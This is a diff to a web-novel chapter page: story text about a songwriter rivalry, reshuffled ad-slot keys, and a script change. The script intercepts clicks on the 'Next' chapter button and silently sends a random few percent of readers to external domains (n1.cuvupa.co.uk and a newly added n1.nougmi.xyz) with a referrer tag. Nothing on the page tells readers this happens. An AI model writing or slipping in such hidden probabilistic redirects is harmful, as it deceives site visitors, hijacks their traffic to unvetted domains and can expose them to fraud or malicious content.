@@ -2391,19 +2391,19 @@
                 <p>&#34;What business acumen does a woman have? Writing a few songs doesn&#39;t make her an expert.&#34;</p>
                 <p>&#34;When &#34;River Banquet&#34; released its synopsis, every studio was scrambling for it. Lowell Entertainment secured it for thirty million.&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>Richard swirled his wine glass triumphantly.</p>
                 <p>William nodded. &#34;Quentin&#39;s team is highly sought-after. Good thing we moved fast.&#34;</p>
                 <p>The mention made Richard grumble again.</p>
                 <p>&#34;Sophia wanted me to wait? For what? I&#39;ve had no projects for half a year!&#34;</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>&#34;What does she know about business? Women are so indecisive...&#34;</p>
                 <p>Meanwhile, at the &#34;We Are Singers&#34; recording set.</p>
                 <p>After receiving confirmation from Nathan and Sophia, Adrian Valentine&#39;s smile widened.</p>
                 <p>&#34;Who would&#39;ve thought the revered &#39;Composer T&#39; is just a fraud. Without Sophia, you&#39;re nothing.&#34;</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>His expression turned sharp.</p>
                 <p>&#34;Nathan, if &#34;Spring Love Song&#34; and that unedited &#34;Child&#39;s Play&#34; represent your true skills, you&#39;re no match for me.&#34;</p>
                 <p>He paused, then added coldly:</p>
@@ -2415,7 +2415,7 @@
                 <p>How dare Adrian criticize others?</p>
                 <p>Publicly bashing competitors shows poor character</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>Their sibling relationship is none of his business</p>
                 <p>Nathan&#39;s fans tried defending him but were overwhelmed by Adrian&#39;s supporters:</p>
                 <p>He&#39;s just stating facts</p>
@@ -2426,7 +2426,7 @@
                 <p>Sophia&#39;s brow furrowed slightly.</p>
                 <p>She studied Lucas quietly, lost in thought.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
             </div>
             
             <div class="font-controls">
@@ -2548,7 +2548,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2564,8 +2564,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
